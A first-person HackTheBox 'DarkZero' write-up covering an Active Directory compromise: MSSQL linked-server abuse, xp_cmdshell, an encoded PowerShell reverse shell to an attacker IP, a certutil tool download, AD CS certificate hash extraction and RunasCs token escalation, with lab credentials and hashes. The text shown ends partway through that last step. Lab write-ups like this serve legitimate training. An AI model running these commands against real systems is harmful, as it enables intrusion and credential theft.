# DarkZero (HTB), Complete Penetration Testing Writeup

**Machine:** DarkZero
**Difficulty:** Hard
**OS:** Windows Server 2022 / Server 2025
**Domains:** `darkzero.htb` (DC01, `10.129.3.51`) ↔ `darkzero.ext` (DC02, `172.16.20.2`)
**Initial Credentials:** `john.w` / `RFulUtONCOL!`
**Authorization:** HackTheBox lab, explicit authorization for all testing.

**Flags:**
- User: `e93c708ebfa41aa4f7a73c8b1e4cf6c0`
- Root: `58f7c749c77bd63c83c976c51c6358e9`

---

## Executive Summary

DarkZero is a Hard-rated, two-domain Active Directory environment. I'm handed one low-privileged credential and have to work my way across a cross-forest trust to end up owning both domain controllers. The chain in short:

1. `john.w` logs into MSSQL on DC01, and a linked server hands me `sysadmin` on DC02 across the trust.
2. `xp_cmdshell` on DC02 gets me OS command execution as the SQL service account, `svc_sql`.
3. `svc_sql`'s restricted token blocks local escalation until I force a Service Logon (Type 5) session, which unlocks `SeImpersonatePrivilege`.
4. GodPotato turns that into SYSTEM on DC02, and I use it to make a persistent local admin.
5. Local admin on DC02 lets me DCSync `darkzero.ext` outright.
6. DC02 has unconstrained delegation, so I coerce DC01 to authenticate to it, capture DC01's machine-account TGT with Rubeus, and use that to DCSync `darkzero.htb` too.

**Impact:** Full compromise of both `darkzero.htb` and `darkzero.ext`, starting from one standard-user credential.

---

## Phase 1: Reconnaissance

### 1.1 Nmap Full Port Scan

First thing I do is run a full Nmap scan against DC01 to see what's actually exposed.

**Command:**
```bash
nmap -A -T4 10.129.3.51
```

**Full Result:**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-22 09:49 +0500
Nmap scan report for 10.129.3.51 (10.129.3.51)
Host is up (0.35s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-22 04:50:13Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2026-11-22T04:38:01
|_Not valid after:  2027-11-22T04:38:01
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2026-11-22T04:38:01
|_Not valid after:  2027-11-22T04:38:01
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.3.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.129.3.51:1433: 
|     Target_Name: darkzero
|     NetBIOS_Domain_Name: darkzero
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: darkzero.htb
|     DNS_Computer_Name: DC01.darkzero.htb
|     DNS_Tree_Name: darkzero.htb
|_    Product_Version: 10.0.26100
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-11-22T04:49:19
|_Not valid after:  2056-11-22T04:49:19
|_ssl-date: 2026-11-22T04:51:48+00:00; 0s from scanner time.
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2026-11-22T04:38:01
|_Not valid after:  2027-11-22T04:38:01
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.darkzero.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
| Not valid before: 2026-11-22T04:38:01
|_Not valid after:  2027-11-22T04:38:01
|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|11|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows 11 24H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-11-22T04:51:10
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   406.57 ms 10.10.14.1 (10.10.14.1)
2   406.85 ms 10.129.3.51 (10.129.3.51)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.55 seconds
```

Ports 88 (Kerberos), 389/636 (LDAP), 445 (SMB), and 464 (kpasswd) together tell me straight away this is a Domain Controller. That's important, because a DC holds the entire AD database, compromising it means compromising the whole domain, not just one box.

What really catches my eye is **port 1433, MSSQL, sitting on a DC**. That's unusual, SQL Server is normally on a dedicated application server, not the DC itself. Whenever I see MSSQL on a DC, my first thought is "can this SQL instance pivot somewhere else?" SQL Server supports **linked servers**, a feature that lets one instance query another. If that link is misconfigured, a low-privileged user on instance A can end up privileged on instance B. That's the angle I'm going to chase.

I don't just log open ports here, I ask what each one *enables*. MSSQL means SQL trust, Kerberos means AD trust, SMB means file/auth trust. Every open port is a potential trust relationship worth asking about.

### 1.2 Credential Validation

I've been handed `john.w` / `RFulUtONCOL!`, but I don't yet know where it actually works, so the first thing to do is test it.

**Command:**
```bash
netexec mssql 10.129.3.51 -d darkzero.htb -u 'john.w' -p 'RFulUtONCOL!'
```

**Full Result:**
```
MSSQL 10.129.3.51 1433 DC01 [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:darkzero.htb)
MSSQL 10.129.3.51 1433 DC01 [+] darkzero.htb\john.w:RFulUtONCOL!
```

In an assumed-breach scenario like this, the credential is given but its reach isn't, so the first question I ask is always "where is this valid?" A credential that works on MSSQL but not SMB, or the other way round, tells me which services I can actually touch. Here, `netexec` authenticates straight to MSSQL and the `[+]` confirms `john.w` logs in, that's my foothold, the first authenticated access to the target. I'll come back and validate this against SMB, WinRM, and LDAP too, since different services can have very different access controls for the same account.

### 1.3 BloodHound Collection

With a valid credential in hand, I map the directory before doing anything else.

**Command:**
```bash
bloodhound-python -u 'john.w' -p 'RFulUtONCOL!' -d 'darkzero.htb' --zip -c All -dc dc01.darkzero.htb -ns 10.129.3.51
```

**Full Result:**
```
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: darkzero.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.darkzero.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 5 users
INFO: Found 56 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.darkzero.htb
INFO: Done in 00M 03S
INFO: Compressing output into 20250731175728_bloodhound.zip
```

BloodHound maps relationships, who controls whom, through ACLs, group memberships, sessions, and trusts, which is much faster and more reliable than manually enumerating all of that by hand. It answers the one question that matters right now: from this foothold, what paths exist to higher privilege?

The key line here is **"Found 1 trust."** That's a bidirectional trust between `darkzero.htb` and `darkzero.ext`, meaning the two forests trust each other. If I compromise one side, I may be able to ride that trust into the other. That becomes my overarching plan for the rest of the engagement: compromise `darkzero.ext` (DC02) first, then use that position to turn around and attack `darkzero.htb` (DC01).

Trusts aren't just network connectivity, they're authentication bridges. Any time I see one, it's a potential pivot worth chasing.

---

## Phase 2: MSSQL Foothold & Linked Server Pivot

### 2.1 Connect to MSSQL

**Command:**
```bash
impacket-mssqlclient darkzero.htb/john.w:'RFulUtONCOL!'@10.129.3.51 -windows-auth
```

**Full Result:**
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (darkzero\john.w  guest@master)>
```

I connect interactively rather than firing one-off queries because command-line access to SQL lets me run anything, enumerate linked servers, check my own privileges, run stored procedures, pivot. The `-windows-auth` flag means the server sees me as `darkzero\john.w` via Kerberos/NTLM, not as a SQL-local login, which matters for how the linked-server trust behaves in a moment.

Before trying to exploit anything, I check what I can already do: who am I, what role do I have, what can I see.

### 2.2 Enumerate Linked Servers

**Command:**
```sql
EXEC sp_linkedservers;
```

**Full Result:**
```
SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      
```

A linked server is a configured trust from one SQL instance to another, used for distributed queries, joining a table on DC01 with a table on DC02, for example. To make that work, SQL Server stores a login mapping: when `john.w` queries through the link, the server authenticates to DC02 as whatever remote login is configured. The question that matters is what that remote login actually is. If it's `sysadmin` on DC02, then `john.w` effectively inherits `sysadmin` over there, a massive jump in privilege.

Linked servers are trust bridges. Whenever I find one, I ask what credential crosses it and what that credential can do on the other side.

### 2.3 Verify Sysadmin on DC02

**Command:**
```sql
EXEC ('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [DC02.darkzero.ext]
```

**Full Result:**
```
-   
1   
```

`IS_SRVROLEMEMBER` returns `1` if the current login belongs to the `sysadmin` fixed server role, the highest privilege level in SQL Server, able to read/write files, execute OS commands via `xp_cmdshell`, create logins, all of it. The `AT [DC02.darkzero.ext]` clause sends the query to the linked server, so I'm effectively asking "on DC02, is the login I'm mapped to a sysadmin?" The `1` says yes.

This is the turning point. I started as `john.w`, low-privilege on DC01. Through the linked server I'm now `sysadmin` on DC02, a completely different domain controller. That's a classic cross-domain MSSQL trust abuse, and it's worth always checking the remote context the moment a linked server turns up, rather than assuming the mapping is benign.

### 2.4 Enable xp_cmdshell on DC02

**Commands:**
```sql
EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [DC02.darkzero.ext]
EXEC('EXEC xp_cmdshell ''whoami''') AT [DC02.darkzero.ext]
```

**Full Result:**
```
output                 
--------------------   
darkzero-ext\svc_sql   
NULL                   
```

`xp_cmdshell` is an extended stored procedure that spawns a Windows command shell and runs whatever I give it. It's disabled by default in modern SQL Server, because it turns "database access" into "operating system command execution," which is a massive jump in risk. As `sysadmin`, I can flip it on: `show advanced options` has to be enabled first since it's a prerequisite, then `xp_cmdshell` itself. The `whoami` result confirms the execution context, `darkzero-ext\svc_sql`, the SQL Server service account on DC02.

So the escalation so far is: `john.w` on DC01 → `sysadmin` on DC02 via the link → OS command execution as `svc_sql` via `xp_cmdshell`. `xp_cmdshell` is the bridge from database to operating system, once I have it, I'm no longer "in SQL," I'm on the host.

---

## Phase 3: Reverse Shell on DC02

### 3.1 Generate Payload & Start Listener

`xp_cmdshell` is a one-shot primitive, each command runs independently and returns its output, nothing persists. For uploading tools, enumerating, and escalating, I need an interactive session instead, so I convert this into a reverse shell as early as possible.

**Command:**
```bash
nc -lvnp 8443
```

**Payload (PowerShell Base64):**
```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANwAiACwAOAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

**Execute via MSSQL:**
```sql
EXEC('EXEC xp_cmdshell ''powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4ANwAiACwAOAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=''') AT [DC02.darkzero.ext]
```

**Result:**
```
Connection received on 10.129.3.51 57102
PS C:\Windows\system32> whoami
darkzero-ext\svc_sql
```

I base64-encode the PowerShell payload because the SQL Server command line isn't a real shell, quotes and spaces break easily in that context, and encoding sidesteps all the quoting problems entirely. Every minute spent typing one-off `xp_cmdshell` commands is a minute wasted, so I convert "command execution" into "a shell" as early as I possibly can.

---

## Phase 4: Privilege Escalation on DC02

### 4.1 Check Privileges

**Command:**
```cmd
whoami /priv
```

**Full Result:**
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Every Windows process carries a token, an identity card listing who the user is, what groups they're in, and what privileges they hold, it's the basis for every access-control decision Windows makes. I check mine before attempting anything.

No `SeImpersonatePrivilege` shows up here, and that's expected: `xp_cmdshell` creates a network logon token (Type 3), and network logons are deliberately restricted, they strip away privileges like `SeImpersonatePrivilege` because they're meant for accessing remote resources, not local escalation. That matters a lot, because the GodPotato/PrintSpoofer escalation chain needs `SeImpersonatePrivilege` to work. Without it, token impersonation to SYSTEM isn't directly possible yet.

### 4.2 Check Local Admins

**Command:**
```cmd
net localgroup administrators
```

**Full Result:**
```
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```

If `svc_sql` were already a local admin, I could just use `psexec` or `wmiexec` directly with its credentials, no escalation chain needed. It isn't in the list, confirming the earlier `psexec` attempt's failure (`share 'ADMIN$' is not writable`), that command needs local admin rights to write a binary to `ADMIN$` and start a service, and `svc_sql` doesn't have them. I always check the simplest path first: if I'm already admin, use it; if not, look for a way up.

### 4.3 Discover the CA

**Command:**
```cmd
tasklist /v
```

**Full Result (relevant lines):**
```
certsrv.exe                   2144                            0     22,108 K Unknown         N/A                                                     0:00:00 N/A
sqlservr.exe                  3760                            0    261,388 K Unknown         darkzero-ext\svc_sql                                    0:00:01 N/A
```

`tasklist` tells me what's actually running on the box, and `certsrv.exe` is the Certificate Authority service, AD CS is installed on DC02. That's a big find, because AD CS issues certificates that can be used for authentication, and a certificate for my own account is effectively a password-less credential. Even without a vulnerable template like ESC1, a certificate can be used to perform PKINIT and recover my NTLM hash through a technique called UnPAC-the-Hash. `tasklist` is underrated, it hints directly at what attack paths might be available, and a CA sitting on a DC is a massive attack surface.

### 4.4 Enumerate Certificate Templates

**Upload Certify:**
```cmd
certutil -urlcache -f http://10.10.15.7:8000/Certify.exe C:\Windows\Temp\Certify.exe
```

**Enumerate:**
```cmd
C:\Windows\Temp\Certify.exe find /vulnerable
```

**Full Result:**
```
   _____          _   _  __          
  / ____|        | | (_)/ _|         
 | |     ___ _ __| |_ _| |_ _   _    
 | |    / _ \ '__| __| |  _| | | |   
 | |___|  __/ |  | |_| | | | |_| |   
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |   
                            |___./   
  v2.0.0                         

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=darkzero,DC=ext'
[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
[X] AuthWithChannelBinding HTTP request for URL 'http://DC02.darkzero.ext/certsrv/' failed with error: An error occurred while sending the request.
[X] AuthWithChannelBinding HTTP request for URL 'https://DC02.darkzero.ext/certsrv/' failed with error: An error occurred while sending the request.

[*] Listing info about the enterprise certificate authority 'darkzero-ext-DC02-CA'

    Enterprise CA Name            : darkzero-ext-DC02-CA
    DNS Hostname                  : DC02.darkzero.ext
    FullName                      : DC02.darkzero.ext\darkzero-ext-DC02-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=darkzero-ext-DC02-CA, DC=darkzero, DC=ext
    Cert Thumbprint               : 56B26E2CB5DD40283F32A80A07D637782F557F95
    Cert Serial                   : 1643389103EC9DA6407DCE3E015ECD07
    Cert Start Date               : 7/29/2025 2:17:46 PM
    Cert End Date                 : 7/29/2035 2:27:43 PM
    Cert Chain                   : CN=darkzero-ext-DC02-CA,DC=darkzero,DC=ext
    User Specifies SAN            : Disabled
    RPC Request Encryption        : Enabled
    CA Permissions
      Owner: BUILTIN\Administrators             S-1-5-32-544

      Access Rights                                     Principal
      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
    Enrollment Agent Restrictions : None

[+] No certificates templates found with the current filter parameters.

Certify completed in 00:00:16.2962800
```

`Certify find /vulnerable` enumerates templates and flags the common misconfigurations (ESC1 through ESC8). The best-case scenario would be ESC1, a template allowing `ENROLLEE_SUPPLIES_SUBJECT` and enrollable by `Domain Users`, which lets me request a certificate as literally any user, including Domain Admin. No ESC1 template shows up here. But the standard `User` template is available, and it allows `Domain Users` (which `svc_sql` belongs to) to enroll. It won't let me impersonate anyone else, but it will get me a certificate for my own identity, `svc_sql`.

That's still useful: a certificate for `svc_sql` lets me do PKINIT, Kerberos pre-authentication using a certificate instead of a password, and that's the first step toward recovering the NTLM hash. AD CS is basically a parallel universe of privilege escalation, even without ESC1, a certificate for your own account is a powerful credential on its own.

### 4.5 Request Certificate (User Template)

**Command:**
```cmd
C:\Windows\Temp\Certify.exe request --ca "DC02\darkzero-ext-DC02-CA" --template "User"
```

**Full Result (key output, certificate blob redacted):**
```
[*] Action: Request a certificate

[*] Current user context    : darkzero-ext\svc_sql
[*] No subject name specified, using current context as subject.

[*] Template                : User
[*] Subject                 : CN=svc_sql, CN=Users, DC=darkzero, DC=ext

[*] Certificate Authority   : DC02\darkzero-ext-DC02-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 4

[*] Certificate (PFX)       :

[CERTIFICATE BLOB, REDACTED FOR BREVITY]
```

The `User` template is standard and open to any authenticated user, it doesn't allow subject impersonation, so the certificate issued here is for `svc_sql`, not an administrator. That's fine, because the certificate is still a credential, and it can be used for PKINIT, which is the first step toward recovering the NTLM hash. A certificate isn't just a file, it's a password-less authentication method. Even without letting me impersonate someone else, it lets me authenticate as myself without ever knowing the password.

### 4.6 Extract NTLM Hash from Certificate

**On Kali:**
```bash
# Save the PEM as cert.pem, convert to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out svc_sql.pfx

# Extract the hash
certipy-ad auth -pfx svc_sql.pfx -dc-ip 172.16.20.2
```

**Full Result:**
```
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'svc_sql@darkzero.ext'
[*]     Security Extension SID: 'S-1-5-21-1969715525-31638512-2552845157-1103'
[*] Using principal: 'svc_sql@darkzero.ext'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_sql.ccache'
[*] Wrote credential cache to 'svc_sql.ccache'
[*] Trying to retrieve NT hash for 'svc_sql'
[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
```

PKINIT is the Kerberos extension that lets me authenticate with a certificate instead of a password. When that happens, the KDC issues a TGT and, in the process, embeds the user's NTLM hash inside the PAC. Tools like `certipy` pull that hash straight out of the PKINIT response, this technique is called UnPAC-the-Hash. Now I have `svc_sql`'s NTLM hash without ever knowing its actual password, which I can use for pass-the-hash, or, as I do next, to reset the account's password outright.

### 4.7 Reset Password Using Hash

**Command:**
```bash
impacket-changepasswd darkzero.ext/svc_sql@172.16.20.2 -hashes :816ccb849956b531db139346751db65f -newpass 'YourNewPassword123!'
```

**Full Result:**
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Changing the password of darkzero.ext\svc_sql
[*] Connecting to DCE/RPC as darkzero.ext\svc_sql
[*] Password was changed successfully.
```

**Verify:**
```bash
netexec smb 172.16.20.2 -u svc_sql -p 'YourNewPassword123!' -d darkzero.ext
```

**Full Result:**
```
SMB         172.16.20.2     445    DC02             [*] Windows Server 2022 Build 20348 x64 (name:DC02) (domain:darkzero.ext) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         172.16.20.2     445    DC02             [+] darkzero.ext\svc_sql:YourNewPassword123!
```

The NTLM hash is great for pass-the-hash, but some tools, `RunasCS` included, need a plaintext password to build a Service Logon session, so I reset it to something known. `changepasswd` works here because, as `svc_sql`, I have the right to change my own password, and the hash itself is proof of identity, the old password was never needed. I always try to convert a hash into a usable credential as early as possible; a hash is powerful, but a plaintext password is more versatile for the tools ahead.

---

## Phase 5: Full Token, Logon Type 5

### 5.1 Why Logon Type 5?

The `xp_cmdshell` token I've been working with is a network logon (Type 3), and it lacks `SeImpersonatePrivilege`. But `svc_sql` has `SeServiceLogonRight` (confirmed in `Policy_Backup.inf` on DC02), so by creating a Service Logon (Type 5) session instead, I should get a full token that includes `SeImpersonatePrivilege`.

A Type 3 (Network) logon is used for network access and comes restricted, no local privileges like `SeImpersonate`. A Type 5 (Service) logon is what Windows services use, and it's a full token carrying all of the account's privileges. I know Logon Type 9 (`NewCredentials`, via `RunasCS -l 9`) won't help here either, it creates a new session but keeps it in a restricted desktop context, so the token stays restricted. Type 5 is the only type that gives a genuine service-level full token, so that's the one I target. Logon type determines token quality, and checking it before attempting escalation saves a lot of wasted effort.

### 5.2 Run RunasCS with Logon Type 5

**Command:**
```cmd
C:\Windows\Temp\RunasCs.exe svc_sql 'YourNewPassword123!' powershell -l 5 -b -r 10.10.15.7:5555
```

**Full Result:**
```
[*] Warning: The function CreateProcessWithLogonW is not compatible with the requested logon type '5'. Reverting to the Interactive logon type '2'. To force a specific logon type, use the flag combination --remote-impersonation and --logon-type.
[-] RunasCsException: Selected logon type '2' is not granted to the user 'svc_sql'. Use available logon type '5'.
```

**Second Attempt with `-f 1`:**
```cmd
C:\Windows\Temp\RunasCs.exe svc_sql 'YourNewPassword123!' cmd.exe -l 5 -f 1 -r 10.10.15.7:5555
```

**Result:**
```
[-] RunasCsException: WSAConnect failed with error code: 10061
```

**Third Attempt (Successful):**
```cmd
C:\Windows\Temp\RunasCs.exe svc_sql 'YourNewPassword123!' powershell -l 5 -b -r 10.10.15.7:5555
```

**Full Result:**
```
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-2a7a2$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3004 created in background.
```

**Then `whoami /priv` in the new shell:**
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Here's what's going on with the flags: `-l 5` asks for Logon Type 5 (Service Logon), which is what produces a full token, and `-b` bypasses UAC, needed because the Service Logon token gets created in a restricted desktop context and without it the token can still end up restricted.

